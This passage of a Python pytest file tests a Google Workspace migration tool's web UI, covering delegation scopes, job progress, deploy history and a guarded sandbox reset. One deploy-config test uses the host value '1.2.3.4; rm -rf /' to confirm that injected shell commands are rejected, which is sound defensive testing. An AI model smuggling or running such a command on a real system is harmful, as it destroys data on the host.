        seed = webui.dwd_payload()["seed"]
        assert "https://www.googleapis.com/auth/admin.reports.usage.readonly" in seed["scope_list"]
        assert "https://www.googleapis.com/auth/admin.directory.user.readonly" in seed["scope_list"]

    def test_reports_which_client_id_the_seed_scopes_actually_need(
            self, tmp_path, monkeypatch):
        """Unlike source/target, there is no dedicated SEED_SA_KEY env var
        set in a fresh checkout -- it resolves to the source key. The
        payload must say so, not just print a scope line with nothing to
        tell the operator which Admin Console entry it belongs on."""
        key = tmp_path / "source-sa.json"
        key.write_text(json.dumps({"client_id": "12345"}))
        monkeypatch.delenv("SEED_SA_KEY", raising=False)
        monkeypatch.setenv("SOURCE_SA_KEY", str(key))

        payload = webui.dwd_payload()
        assert payload["seed"]["client_id"] == "12345"
        assert payload["seed"]["shares_source_key"] is True

    def test_a_dedicated_seed_key_is_not_flagged_as_shared(
            self, tmp_path, monkeypatch):
        source_key = tmp_path / "source-sa.json"
        source_key.write_text(json.dumps({"client_id": "111"}))
        seed_key = tmp_path / "seed-sa.json"
        seed_key.write_text(json.dumps({"client_id": "222"}))
        monkeypatch.setenv("SOURCE_SA_KEY", str(source_key))
        monkeypatch.setenv("SEED_SA_KEY", str(seed_key))

        payload = webui.dwd_payload()
        assert payload["seed"]["client_id"] == "222"
        assert payload["seed"]["shares_source_key"] is False

    def test_target_provision_line_carries_the_write_scope(self):
        """provision-users creates accounts, which needs admin.directory.user
        (write) -- a scope the target migration line deliberately omits. The
        UI must hand the user a target line that carries both, or the Create
        the missing target accounts button dies with unauthorized_client."""
        from config import Settings, target_scopes

        payload = webui.dwd_payload()
        line = set(payload["target_provision"]["scope_list"])

        assert "https://www.googleapis.com/auth/admin.directory.user" in line
        assert set(target_scopes(Settings())) <= line  # migration scopes survive


class TestEnvironmentFailuresAreNotCredentialFailures:
    """
    A broken client library is not a bad key.

    Seen live: a virtualenv under /tmp was partially deleted by the OS's
    temp-file cleaner, leaving `googleapiclient.discovery_cache` importable but
    gutted. The live check surfaced
    "module 'googleapiclient.discovery_cache' has no attribute 'get_static_doc'"
    next to a ✕, which reads as "your credential failed" and sends someone to
    regenerate a key that was never at fault.
    """

    SA = TestCredentialChecker.SA

    @pytest.fixture(autouse=True)
    def _sandbox(self, tmp_path, monkeypatch):
        import config

        real = config.Settings
        self.tmp = tmp_path

        def fake(*a, **k):
            st = real(*a, **k)
            st.source_sa_key = str(tmp_path / "keys" / "source-sa.json")
            st.source_admin = "info@src.com"
            return st

        monkeypatch.setattr(config, "Settings", fake)
        keys = tmp_path / "keys"
        keys.mkdir()
        (keys / "source-sa.json").write_text(json.dumps(self.SA))

    def test_a_gutted_library_is_named_as_an_install_problem(self, monkeypatch):
        import auth

        class Broken:
            def __init__(self, *a, **k):
                raise AttributeError(
                    "module 'googleapiclient.discovery_cache' has no "
                    "attribute 'get_static_doc'")

        monkeypatch.setattr(auth, "AuthManager", Broken)
        res = webui.live_check("source_key")

        assert res["ok"] is False
        assert res.get("environment") is True
        assert "client library in this environment is broken" in res["error"]
        assert "says nothing about the key itself" in res["error"]

    def test_a_missing_dependency_is_also_an_install_problem(self, monkeypatch):
        import auth

        class Missing:
            def __init__(self, *a, **k):
                raise ImportError("No module named 'googleapiclient'")

        monkeypatch.setattr(auth, "AuthManager", Missing)
        res = webui.live_check("source_key")
        assert res.get("environment") is True

    def test_a_real_auth_failure_is_still_reported_as_one(self, monkeypatch):
        """The new branch must not swallow genuine credential errors."""
        import auth

        class Fake:
            def __init__(self, *a, **k):
                pass

            def verify_delegation(self, tenant, user):
                return False, "unauthorized_client"

        monkeypatch.setattr(auth, "AuthManager", Fake)
        res = webui.live_check("source_key")

        assert res["ok"] is False
        assert not res.get("environment")
        assert "not authorised" in res["error"]


class TestJobDuration:
    """
    A finished job's duration must stop counting.

    It was computed as `now - started` on every poll, so the number kept
    climbing after the process exited. An init-db whose own log showed it
    finishing in under a second was reported as "exit 0 · 105.1s" -- a
    performance problem that did not exist.
    """

    def test_a_finished_job_reports_a_stable_duration(self):
        import time as _t

        job = webui.Job()
        ok, _ = job.start("true", ["/usr/bin/true"])
        assert ok

        for _ in range(100):
            if not job.running:
                break
            _t.sleep(0.05)
        assert not job.running

        first = job.snapshot()["elapsed"]
        _t.sleep(0.6)
        second = job.snapshot()["elapsed"]

        assert first == second, f"duration grew from {first} to {second}"
        assert first < 5

    def test_a_running_job_still_counts_up(self):
        import time as _t

        job = webui.Job()
        job.start("sleep", ["/bin/sleep", "2"])
        first = job.snapshot()["elapsed"]
        _t.sleep(0.5)
        second = job.snapshot()["elapsed"]
        assert second > first
        job.stop()

    def test_a_fresh_job_reports_zero(self):
        assert webui.Job().snapshot()["elapsed"] == 0


class TestDeployHistory:
    """
    Nothing tracked this before: "did the last deploy to this VPS actually
    work, and what commit is running there now" had no answer except SSHing
    in and checking by hand. A flat JSON file, not migration.db, because a
    deploy can happen before that database exists at all.
    """

    @pytest.fixture(autouse=True)
    def _isolated_history_file(self, tmp_path, monkeypatch):
        monkeypatch.setattr(webui, "DEPLOY_HISTORY_PATH",
                            str(tmp_path / "deploy_history.json"))

    def test_a_fresh_install_has_no_history(self):
        assert webui.load_deploy_history() == []

    def test_starting_a_deploy_records_an_in_progress_entry(self):
        rec_id = webui.record_deploy_start(
            "203.0.113.10", "root", "22", "8080", False, "abc1234")
        history = webui.load_deploy_history()
        assert len(history) == 1
        assert history[0]["id"] == rec_id
        assert history[0]["host"] == "203.0.113.10"
        assert history[0]["commit"] == "abc1234"
        assert history[0]["rc"] is None
        assert history[0]["finishedAt"] is None

    def test_finishing_updates_the_same_record_in_place(self):
        rec_id = webui.record_deploy_start(
            "203.0.113.10", "root", "22", "8080", False, "abc1234")
        webui.record_deploy_finish(rec_id, 0)
        history = webui.load_deploy_history()
        assert len(history) == 1
        assert history[0]["rc"] == 0
        assert history[0]["finishedAt"] is not None

    def test_most_recent_deploy_is_first(self):
        first = webui.record_deploy_start(
            "10.0.0.1", "root", "22", "8080", False, "aaa1111")
        webui.record_deploy_finish(first, 0)
        second = webui.record_deploy_start(
            "10.0.0.2", "root", "22", "8080", False, "bbb2222")
        history = webui.load_deploy_history()
        assert history[0]["id"] == second
        assert history[1]["id"] == first

    def test_credentials_flag_is_recorded_not_the_credentials_themselves(self):
        webui.record_deploy_start(
            "10.0.0.1", "root", "22", "8080", True, "abc1234")
        assert webui.load_deploy_history()[0]["includeCredentials"] is True

    def test_history_is_capped_so_it_cannot_grow_without_bound(self):
        for i in range(webui._MAX_DEPLOY_HISTORY + 10):
            webui.record_deploy_start(
                f"10.0.0.{i % 255}", "root", "22", "8080", False, "abc1234")
        assert len(webui.load_deploy_history()) == webui._MAX_DEPLOY_HISTORY

    def test_a_corrupt_history_file_reads_as_empty_not_a_crash(self, tmp_path):
        bad = tmp_path / "corrupt.json"
        bad.write_text("{not valid json")
        webui.DEPLOY_HISTORY_PATH = str(bad)
        assert webui.load_deploy_history() == []

    def test_a_job_reports_its_outcome_through_on_finish(self):
        """The real wiring an actual /api/deploy uses: Job.start()'s
        on_finish callback is how history learns a detached subprocess's
        rc without polling for it."""
        import time as _t

        seen = []
        job = webui.Job()
        ok, _ = job.start("true", ["/usr/bin/true"],
                          on_finish=lambda rc: seen.append(rc))
        assert ok
        for _ in range(100):
            if seen:
                break
            _t.sleep(0.05)
        assert seen == [0]

    def test_on_finish_raising_does_not_break_the_drain_thread(self):
        """A broken history write must not take the job's own tracked
        state down with it."""
        import time as _t

        job = webui.Job()
        ok, _ = job.start("true", ["/usr/bin/true"],
                          on_finish=lambda rc: (_ for _ in ()).throw(OSError("disk full")))
        assert ok
        for _ in range(100):
            if not job.running:
                break
            _t.sleep(0.05)
        assert job.snapshot()["rc"] == 0


class TestSeedProgressParsing:
    """
    seed_sandbox.py has no structured progress protocol -- it is a CLI
    script printing to stdout, not an API -- so the nav bar's progress
    figure for an in-flight seed job has to be derived from its own
    printed lines. Real, not fabricated: "Seeding N users" always prints
    once, and exactly one "done in"/"FAILED" line prints per user as it
    finishes, so this is an attempted-so-far count against a real total,
    not a guess.
    """

    def test_no_seeding_line_yet_is_unknown_not_zero(self):
        """Before "Seeding N users..." prints, there is no real total to
        divide by -- None, not a fabricated 0%."""
        assert webui._seed_progress_pct(["Sandbox guard passed for x.com."]) is None

    def test_counts_both_done_and_failed_as_attempted(self):
        lines = [
            "Seeding 4 users in x.com at scale small",
            "  [a@x.com] starting (Eng, P1)",
            "  [b@x.com] starting (Sales, P2)",
            "  [a@x.com] done in 12.0s: 5 files",
            "  ! b@x.com FAILED: HTTP 401 (authError): session invalid",
        ]
        assert webui._seed_progress_pct(lines) == 50

    def test_a_completed_run_reaches_100(self):
        lines = ["Seeding 2 users in x.com at scale small",
                "  [a@x.com] done in 1.0s: 1 files",
                "  [b@x.com] done in 1.0s: 1 files"]
        assert webui._seed_progress_pct(lines) == 100

    def test_an_unattempted_user_does_not_count(self):
        lines = ["Seeding 3 users in x.com at scale small",
                "  [a@x.com] starting (Eng, P1)",
                "  [a@x.com] done in 1.0s: 1 files"]
        assert webui._seed_progress_pct(lines) == round(1 / 3 * 100)

    def test_a_per_label_failure_line_is_not_mistaken_for_a_user_failure(self):
        """"! label Archive: HTTP 400 ..." must not match the FAILED-user
        pattern -- it is a sub-step failure inside one user's run, not
        that user finishing (successfully or not)."""
        lines = ["Seeding 1 users in x.com at scale small",
                "  [a@x.com] starting (Eng, P1)",
                "  ! label Archive: HTTP 400 (invalidArgument): bad name"]
        assert webui._seed_progress_pct(lines) == 0

    def test_snapshot_only_computes_this_for_a_seed_job(self):
        job = webui.Job()
        job.lines = ["Seeding 2 users in x.com at scale small",
                    "  [a@x.com] done in 1.0s: 1 files"]
        job.name = "migrate"
        assert job.snapshot()["progressPct"] is None
        job.name = "seed"
        assert job.snapshot()["progressPct"] == 50


class TestJobBackedActivity:
    """
    seed_sandbox.py, reset_target.py, and deploy_remote.py never write to
    audit_log -- seed_sandbox.py calls Google's APIs directly, and none of
    the three are the migration engine at all. Without a synthetic entry,
    the Activity Feed had no way to show any of them running, no matter
    what state the ledger was in.
    """

    @pytest.fixture(autouse=True)
    def _reset_job(self, monkeypatch):
        monkeypatch.setattr(webui, "JOB", webui.Job())

    def test_no_job_ever_run_is_no_entry(self):
        assert webui._job_activity_entry() is None

    def test_a_running_job_is_in_progress(self):
        webui.JOB.name = "seed"
        webui.JOB.lines = ["line one", "line two"]
        webui.JOB.proc = _FakeRunningProc()
        entry = webui._job_activity_entry()
        assert entry["status"] == "in_progress"
        assert entry["action"] == "seed running"
        assert entry["details"] == "line two"
        assert entry["user"] == "System"

    def test_a_clean_finish_is_completed(self):
        webui.JOB.name = "seed"
        webui.JOB.lines = ["all done"]
        webui.JOB.proc = None
        webui.JOB.rc = 0
        entry = webui._job_activity_entry()
        assert entry["status"] == "completed"
        assert "finished" in entry["action"]

    def test_a_nonzero_exit_needs_attention(self):
        webui.JOB.name = "seed"
        webui.JOB.lines = ["boom"]
        webui.JOB.proc = None
        webui.JOB.rc = 1
        entry = webui._job_activity_entry()
        assert entry["status"] == "needs_attention"
        assert "exit 1" in entry["action"]

    def test_blank_trailing_lines_are_skipped_for_details(self):
        webui.JOB.name = "seed"
        webui.JOB.lines = ["the real last line", "", "   "]
        webui.JOB.proc = _FakeRunningProc()
        assert webui._job_activity_entry()["details"] == "the real last line"

    def test_spa_activity_payload_puts_the_job_entry_first(self, monkeypatch):
        """Real ledger rows must still show -- the job is additional
        context at the top, not a replacement for them."""
        monkeypatch.setattr(webui, "_db_conn", lambda: None)
        webui.JOB.name = "seed"
        webui.JOB.lines = ["working"]
        webui.JOB.proc = _FakeRunningProc()

        payload = webui.spa_activity_payload()
        assert payload["activity"][0]["action"] == "seed running"
        # "no database yet" is still real diagnostic information and must
        # not be dropped just because there is also a job to show.
        assert payload["error"] == "no database yet"

    def test_no_job_and_no_database_is_an_empty_list_not_a_crash(self, monkeypatch):
        monkeypatch.setattr(webui, "_db_conn", lambda: None)
        payload = webui.spa_activity_payload()
        assert payload["activity"] == []
        assert payload["error"] == "no database yet"


class _FakeRunningProc:
    """A stand-in for subprocess.Popen whose .poll() reports still-alive,
    which is all Job.running actually checks."""
    def poll(self):
        return None


class TestJobProgressAndEta:
    """
    The Activity Feed's synthetic job row needs a progress bar and an ETA,
    not just a status pill -- an operator watching an 11-user, 5-minute
    migration had no way to tell "almost done" from "just started" without
    tailing the raw output. ETA is linear extrapolation from elapsed time
    and fraction complete, so it is only shown while the job still runs;
    a stopped job's "time left" is meaningless.
    """

    @pytest.fixture(autouse=True)
    def _reset_job(self, monkeypatch):
        monkeypatch.setattr(webui, "JOB", webui.Job())

    def test_seed_progress_yields_an_eta_while_running(self, monkeypatch):
        job = webui.Job()
        job.name = "seed"
        job.started = 100.0
        job.lines = ["Seeding 4 users in x.com at scale small",
                    "  [a@x.com] done in 1.0s: 1 files"]
        job.proc = _FakeRunningProc()
        monkeypatch.setattr(webui.time, "time", lambda: 110.0)  # 10s elapsed
        snap = job.snapshot()
        assert snap["progressPct"] == 25
        # 10s for 25% -> 30s left for the remaining 75%.
        assert snap["etaSeconds"] == 30

    def test_a_stopped_job_keeps_its_final_percentage_but_drops_the_eta(self):
        job = webui.Job()
        job.name = "seed"
        job.started = 100.0
        job.finished = 110.0
        job.lines = ["Seeding 2 users in x.com at scale small",
                    "  [a@x.com] done in 1.0s: 1 files",
                    "  [b@x.com] done in 1.0s: 1 files"]
        job.proc = None
        job.rc = 0
        snap = job.snapshot()
        assert snap["progressPct"] == 100
        assert snap["etaSeconds"] is None

    def test_migrate_progress_reads_the_ledger_fraction_not_the_lines(self, monkeypatch):
        monkeypatch.setattr(webui, "_ledger_progress_fraction", lambda: 0.4)
        job = webui.Job()
        job.name = "migrate"
        job.started = 100.0
        job.lines = ["this text is never parsed for migrate"]
        job.proc = _FakeRunningProc()
        monkeypatch.setattr(webui.time, "time", lambda: 140.0)  # 40s elapsed
        snap = job.snapshot()
        assert snap["progressPct"] == 40
        # 40s for 40% -> 60s left for the remaining 60%.
        assert snap["etaSeconds"] == 60

    def test_an_empty_ledger_reports_no_percentage_or_eta(self, monkeypatch):
        monkeypatch.setattr(webui, "_ledger_progress_fraction", lambda: None)
        job = webui.Job()
        job.name = "migrate"
        job.started = 100.0
        job.proc = _FakeRunningProc()
        snap = job.snapshot()
        assert snap["progressPct"] is None
        assert snap["etaSeconds"] is None

    def test_a_job_type_with_no_progress_source_reports_neither(self):
        job = webui.Job()
        job.name = "deploy"
        job.started = 100.0
        job.proc = _FakeRunningProc()
        snap = job.snapshot()
        assert snap["progressPct"] is None
        assert snap["etaSeconds"] is None

    def test_zero_percent_never_divides_by_zero_for_an_eta(self, monkeypatch):
        monkeypatch.setattr(webui, "_ledger_progress_fraction", lambda: 0.0)
        job = webui.Job()
        job.name = "migrate"
        job.started = 100.0
        job.proc = _FakeRunningProc()
        monkeypatch.setattr(webui.time, "time", lambda: 150.0)
        snap = job.snapshot()
        assert snap["progressPct"] == 0
        assert snap["etaSeconds"] is None

    def test_activity_entry_carries_progress_and_eta_through(self, monkeypatch):
        monkeypatch.setattr(webui, "_ledger_progress_fraction", lambda: 0.5)
        webui.JOB.name = "migrate"
        webui.JOB.started = 100.0
        webui.JOB.lines = ["some output"]
        webui.JOB.proc = _FakeRunningProc()
        monkeypatch.setattr(webui.time, "time", lambda: 120.0)
        entry = webui._job_activity_entry()
        assert entry["progressPct"] == 50
        assert entry["etaSeconds"] == 20


class TestInitDbRejectsAStaleCsv:
    """
    identities.csv is regenerated by the seeder and otherwise sits in the
    working directory indefinitely. Pointing a new tenant pair at an old
    checkout loaded the *previous* migration's users and printed
    "Loaded 5 identity mappings." -- the command did exactly what it was told,
    with input nobody had re-read.
    """

    def _csv(self, tmp_path, pairs):
        p = tmp_path / "identities.csv"
        p.write_text("source_email,target_email,entity_type\n" +
                     "".join(f"{a},{b},user\n" for a, b in pairs))
        return str(p)

    def test_domains_are_read_without_loading(self, tmp_path):
        from main import read_identity_csv_domains

        path = self._csv(tmp_path, [("a@x.com", "a@y.com")])
        rows = read_identity_csv_domains(path)
        assert rows == [{"source_email": "a@x.com", "target_email": "a@y.com"}]

    def test_a_stale_csv_is_detected(self, tmp_path):
        from main import identity_domain_mismatch, read_identity_csv_domains
        from config import Settings

        path = self._csv(tmp_path, [
            ("alice@one.example.com", "alice@two.example.com")])
        st = Settings()
        st.source_domain, st.target_domain = "c.example.com", "a.example.com"

        msg = identity_domain_mismatch(read_identity_csv_domains(path), st)
        assert "one.example.com" in msg

    def test_a_matching_csv_passes(self, tmp_path):
        from main import identity_domain_mismatch, read_identity_csv_domains
        from config import Settings

        path = self._csv(tmp_path, [("alice@c.example.com", "alice@a.example.com")])
        st = Settings()
        st.source_domain, st.target_domain = "c.example.com", "a.example.com"

        assert identity_domain_mismatch(read_identity_csv_domains(path), st) == ""

    def test_an_unreadable_csv_returns_no_rows_rather_than_raising(self, tmp_path):
        from main import read_identity_csv_domains

        assert read_identity_csv_domains(str(tmp_path / "absent.csv")) == []

    def test_force_is_available_as_an_escape_hatch(self):
        """Refusing outright with no override would block legitimate cases --
        a deliberate cross-domain map, or a rename mid-migration."""
        import main

        parser = main.build_parser() if hasattr(main, "build_parser") else None
        if parser is None:
            import inspect
            src = inspect.getsource(main)
            assert '"--force"' in src


class TestRunModeEndpoint:
    @pytest.fixture(autouse=True)
    def _env(self, tmp_path, monkeypatch):
        monkeypatch.setattr(webui, "ENV_PATH", str(tmp_path / "env.sh"))
        monkeypatch.delenv("RUN_MODE", raising=False)

    def test_setting_a_mode_persists_and_applies(self):
        from config import Settings

        assert webui.set_run_mode("seed_only")["ok"]
        assert "export RUN_MODE=seed_only" in open(webui.ENV_PATH).read()
        assert Settings().run_mode == "seed_only"

    def test_unknown_mode_is_refused(self):
        for bad in ("nonsense", "", "SEED_ONLY"):
            assert not webui.set_run_mode(bad)["ok"]

    def test_changing_the_mode_invalidates_the_status_snapshot(self, monkeypatch):
        """The snapshot is cached for 30s. Without invalidation, switching mode
        appeared to do nothing -- the answer had already been computed under
        the old setting and was simply replayed."""
        monkeypatch.setattr(webui, "_compute_status", lambda: {"n": 1})
        webui.status_payload()
        with webui._snap_lock:
            assert webui._snap["at"] > 0

        webui.set_run_mode("seed_only")

        with webui._snap_lock:
            assert webui._snap["at"] == 0.0

    def test_uploading_a_credential_also_invalidates(self, tmp_path, monkeypatch):
        """Step 3's answer changes the moment a key lands."""
        import config

        real = config.Settings
        monkeypatch.setattr(config, "Settings", lambda *a, **k: type(
            "S", (), {"source_sa_key": str(tmp_path / "k.json"),
                      "target_sa_key": str(tmp_path / "t.json"),
                      "oauth_client_secrets": str(tmp_path / "c.json")})())
        monkeypatch.setattr(webui, "_compute_status", lambda: {"n": 1})
        webui.status_payload()

        webui.upload_credential("source_key", json.dumps(
            TestCredentialChecker.SA))

        with webui._snap_lock:
            assert webui._snap["at"] == 0.0


class TestEnvIsRewrittenForTheRemoteHost:
    """
    env.sh holds absolute paths from whichever machine wrote it, and rsync
    ships them verbatim.

    Observed live: a Mac's MIGRATION_DB=/Users/aryan/Repos/calude-workspace/
    migration.db was recreated *literally* on a Linux VPS — the directory tree
    and all. The migration ran correctly against it, which is the problem: a
    working system with its ledger somewhere nobody would ever look, outside
    the deployment directory and invisible to anything that inspects it.
    """

    def test_machine_specific_paths_are_stripped_on_deploy(self):
        import inspect

        src = inspect.getsource(deploy_remote.deploy)
        for var in ("MIGRATION_DB", "SCRATCH_DIR", "SOURCE_SA_KEY",
                    "TARGET_SA_KEY", "OAUTH_TOKEN_DIR"):
            assert var in src, f"{var} is still shipped verbatim"

    def test_tenant_settings_are_not_stripped(self):
        """Domains and admin addresses are machine-independent and are the
        whole point of shipping env.sh at all."""
        import inspect

        src = inspect.getsource(deploy_remote.deploy)
        strip_line = [l for l in src.splitlines() if "strip = " in l]
        assert strip_line, "no strip list found"
        joined = " ".join(strip_line)
        for keep in ("SOURCE_DOMAIN", "TARGET_DOMAIN", "SOURCE_ADMIN",
                     "TARGET_ADMIN", "AUTH_MODE", "RUN_MODE"):
            assert keep not in joined, f"{keep} must survive the deploy"

    def test_the_rewrite_only_runs_when_credentials_are_shipped(self):
        """A code-only deploy never sends env.sh, so there is nothing to fix."""
        import inspect

        src = inspect.getsource(deploy_remote.deploy)
        lines = src.splitlines()
        rewrite_line = next(i for i, l in enumerate(lines)
                            if "rewriting env.sh" in l)
        # the nearest preceding conditional must be the credentials guard
        guards = [l.strip() for l in lines[:rewrite_line] if l.strip().startswith("if ")]
        assert guards[-1] == "if include_credentials:", guards[-1]


class TestChatImportScope:
    """
    Chat creates every space with importMode=True, which Google gates behind
    a scope the tool never requested. All 12 spaces of a live run failed with
    "Creating a space in import mode requires the chat.import authorization
    scope", and because it arrived as a per-space 403 it looked like twelve
    item failures rather than one configuration error.
    """

    def _settings(self, **kw):
        from config import Settings

        s = Settings()
        for k, v in kw.items():
            setattr(s, k, v)
        return s

    def test_target_requests_chat_import_when_chat_is_on(self):
        from config import CHAT_IMPORT_SCOPE, target_scopes

        assert CHAT_IMPORT_SCOPE in target_scopes(self._settings(migrate_chat=True))

    def test_no_chat_scopes_at_all_when_chat_is_off(self):
        from config import CHAT_IMPORT_SCOPE, target_scopes

        assert CHAT_IMPORT_SCOPE not in target_scopes(self._settings(migrate_chat=False))

    def test_the_source_is_not_widened_by_chat_import(self):
        """The source only reads spaces. Granting it the ability to create
        them in import mode widens a deliberately read-only credential for
        no reason."""
        from config import CHAT_IMPORT_SCOPE, source_scopes

        assert CHAT_IMPORT_SCOPE not in source_scopes(self._settings(migrate_chat=True))


class TestResetTargetFromTheUI:
    """
    Running reset_target.py from the browser.

    Mirrors TestSeedFromTheUI, pointed at the other tenant and the other
    domain: reset_target.py's own guard (assert_sandbox) needs
    SANDBOX_MODE=true, an exact --confirm-domain match on TARGET_DOMAIN, and
    a PROTECTED_DOMAINS deny list. The typed-domain check here fails fast with
    a specific message; the guard that actually matters runs again inside
    reset_target.py regardless of what this function decides.
    """

    @pytest.fixture(autouse=True)
    def _env(self, monkeypatch):
        monkeypatch.setenv("SOURCE_DOMAIN", "sandbox-src.example")
        monkeypatch.setenv("TARGET_DOMAIN", "sandbox-tgt.example")
        monkeypatch.delenv("PROTECTED_DOMAINS", raising=False)

    def test_correct_confirmation_builds_the_command(self):
        argv, env, err = webui.reset_target_argv(
            {"confirm_domain": "sandbox-tgt.example"})
        assert err == ""
        assert argv[argv.index("--confirm-domain") + 1] == "sandbox-tgt.example"
        assert "--yes" in argv
        assert env["SANDBOX_MODE"] == "true"

    def test_yes_is_always_passed(self):
        """Without --yes reset_target.py's confirm prompt blocks on the web
        server's stdin, and the job looks alive while doing no work."""
        argv, _, _ = webui.reset_target_argv({"confirm_domain": "sandbox-tgt.example"})
        assert "--yes" in argv

    def test_nothing_typed_is_refused(self):
        _, _, err = webui.reset_target_argv({})
        assert "type the target domain" in err

    def test_a_mismatched_domain_is_refused(self):
        _, _, err = webui.reset_target_argv({"confirm_domain": "something-else.com"})
        assert "does not match the target domain" in err

    def test_typing_the_source_domain_is_called_out_specifically(self):
        """The dangerous slip in the opposite direction from seeding: typing
        the source here would not touch anything (the guard only checks
        against TARGET_DOMAIN), but a wrong belief about which domain this
        button empties is exactly the kind of mistake worth naming instead of
        leaving as a generic mismatch."""
        _, _, err = webui.reset_target_argv({"confirm_domain": "sandbox-src.example"})
        assert "SOURCE domain" in err

    def test_protected_domains_are_refused(self, monkeypatch):
        monkeypatch.setenv("PROTECTED_DOMAINS", "sandbox-tgt.example,corp.com")
        _, _, err = webui.reset_target_argv({"confirm_domain": "sandbox-tgt.example"})
        assert "PROTECTED_DOMAINS" in err

    def test_protected_check_is_case_insensitive(self, monkeypatch):
        monkeypatch.setenv("PROTECTED_DOMAINS", "SANDBOX-TGT.EXAMPLE")
        _, _, err = webui.reset_target_argv({"confirm_domain": "sandbox-tgt.example"})
        assert "PROTECTED_DOMAINS" in err

    def test_the_command_is_an_argv_list_not_a_shell_string(self):
        argv, _, _ = webui.reset_target_argv({"confirm_domain": "sandbox-tgt.example"})
        assert isinstance(argv, list)
        assert all(isinstance(a, str) for a in argv)

    def test_reset_target_only_ever_targets_the_target(self):
        """There is no code path that points this at the source: the domain
        is read from TARGET_DOMAIN, never from the request body."""
        argv, _, _ = webui.reset_target_argv({"confirm_domain": "sandbox-tgt.example"})
        assert "sandbox-src.example" not in argv

    def test_services_is_optional_and_defaults_to_a_full_wipe(self):
        """Omitting it must not change behavior for a caller that has never
        heard of it -- reset_target.py's own --services default is already
        all four services."""
        argv, _, _ = webui.reset_target_argv({"confirm_domain": "sandbox-tgt.example"})
        assert "--services" not in argv

    def test_services_narrows_the_wipe_to_what_is_asked_for(self):
        """Confirmed live: comparing Drive transfer modes needed a way to
        wipe only Drive without also destroying already-correct Gmail/
        Calendar/Chat data from the same tenant."""
        argv, _, _ = webui.reset_target_argv(
            {"confirm_domain": "sandbox-tgt.example", "services": "drive"})
        assert "--services" in argv
        assert argv[argv.index("--services") + 1] == "drive"

    def test_services_list_is_joined_not_stringified(self):
        argv, _, _ = webui.reset_target_argv(
            {"confirm_domain": "sandbox-tgt.example", "services": ["drive", "gmail"]})
        assert argv[argv.index("--services") + 1] == "drive,gmail"


class TestDeployConfigPersistence:
    """
    The VPS connection Deploy last used, saved to env.sh the same way
    source/target domain config already is -- previously it lived only in
    the browser's in-memory JS state, gone on every reload and never
    reachable from the SPA (which had no deploy UI at all).
    """

    def test_defaults_when_nothing_saved_yet(self, tmp_path, monkeypatch):
        monkeypatch.setattr(webui, "ENV_PATH", str(tmp_path / "env.sh"))
        cfg = webui.read_deploy_config()
        assert cfg == {"host": "", "user": "root", "port": "22",
                      "key": "", "ui_port": "8080"}

    def test_a_saved_host_round_trips(self, tmp_path, monkeypatch):
        monkeypatch.setattr(webui, "ENV_PATH", str(tmp_path / "env.sh"))
        clean, err = webui.validate_deploy_config(
            {"host": "203.0.113.10", "user": "ubuntu", "port": 2222})
        assert err == ""
        webui.write_config_raw(clean)
        cfg = webui.read_deploy_config()
        assert cfg["host"] == "203.0.113.10"
        assert cfg["user"] == "ubuntu"
        assert cfg["port"] == "2222"

    def test_saving_preserves_unrelated_env_entries(self, tmp_path, monkeypatch):
        env = tmp_path / "env.sh"
        env.write_text("export SOURCE_DOMAIN=c.example.com\n")
        monkeypatch.setattr(webui, "ENV_PATH", str(env))

        clean, _ = webui.validate_deploy_config({"host": "203.0.113.10"})
        webui.write_config_raw(clean)

        text = env.read_text()
        assert "SOURCE_DOMAIN=c.example.com" in text
        assert "DEPLOY_HOST=203.0.113.10" in text

    def test_an_invalid_host_is_rejected_not_saved(self):
        clean, err = webui.validate_deploy_config(
            {"host": "1.2.3.4; rm -rf /"})
        assert err
        assert clean == {}

    def test_a_missing_key_file_is_rejected_not_saved(self, tmp_path):
        clean, err = webui.validate_deploy_config(
            {"host": "203.0.113.10", "key": str(tmp_path / "absent")})
        assert "no SSH key" in err
        assert clean == {}

    def test_a_non_numeric_port_is_rejected(self):
        _, err = webui.validate_deploy_config(
            {"host": "203.0.113.10", "port": "not-a-number"})
        assert "port must be a number" in err

    def test_defaults_apply_when_only_host_is_given(self):
        clean, err = webui.validate_deploy_config({"host": "203.0.113.10"})
        assert err == ""
        assert clean["DEPLOY_USER"] == "root"
        assert clean["DEPLOY_PORT"] == "22"
        assert clean["DEPLOY_UI_PORT"] == "8080"

    def test_config_payload_includes_the_saved_deploy_target(
            self, tmp_path, monkeypatch):
        """The one bundled GET both UIs already poll -- the SPA has no
        deploy UI of its own to add a second endpoint for, so this is the
        only way it can ever learn a saved VPS target exists."""
        env = tmp_path / "env.sh"
        env.write_text("export DEPLOY_HOST=203.0.113.10\n"
                       "export DEPLOY_USER=ubuntu\n")
        monkeypatch.setattr(webui, "ENV_PATH", str(env))
        cfg = webui.read_deploy_config()
        assert cfg["host"] == "203.0.113.10"
        assert cfg["user"] == "ubuntu"


class TestHostInfo:
    """
    Where this process is actually running -- found the hard way once
    already, when a local seed run and a VPS deployment both bound
    127.0.0.1:8080 and looked identical in the browser, with nothing on
    screen saying which one a given tab was actually talking to.
    """

    def test_reports_this_machine_and_code_path(self, monkeypatch):
        monkeypatch.setattr(webui, "_HOST_INFO_CACHE", None)
        info = webui.host_info()
        assert info["hostname"]
        assert info["code_path"] == os.path.dirname(os.path.abspath(webui.__file__))
        assert info["pid"] == os.getpid()

    def test_result_is_cached_not_recomputed_per_call(self, monkeypatch):
        """None of this changes while the process is running -- no reason
        to shell out to git on every /api/config poll."""
        monkeypatch.setattr(webui, "_HOST_INFO_CACHE", None)
        first = webui.host_info()
        first["hostname"] = "mutated-to-prove-its-the-same-object"
        assert webui.host_info() is first

    def test_survives_a_directory_with_no_git_history(self, tmp_path, monkeypatch):
        """deploy_remote.py's own target is a plain rsync copy with no .git
        at all (see its module docstring for why) -- an absent commit there
        is the normal case, not a failure."""
        monkeypatch.setattr(webui, "_HOST_INFO_CACHE", None)
        monkeypatch.setattr(webui, "__file__", str(tmp_path / "webui.py"))
        info = webui.host_info()
        assert info["commit"] == ""

    def test_a_private_address_is_shown_as_local_machine(self, monkeypatch):
        """A laptop's outbound interface is almost always RFC1918/loopback --
        the address itself means nothing to the operator (every machine on
        a LAN has one), so it is named instead of printed."""
        monkeypatch.setattr(webui, "_HOST_INFO_CACHE", None)
        monkeypatch.setattr(webui, "_primary_ip", lambda: "192.168.1.42")
        info = webui.host_info()
        assert info["ip"] == "192.168.1.42"
        assert info["location"] == "Local machine"

    def test_a_public_address_is_shown_as_itself(self, monkeypatch):
        """A VPS's outbound interface is a routable public IP -- that IS
        the useful answer to "where is this running", so show it directly
        rather than replacing it with a generic label."""
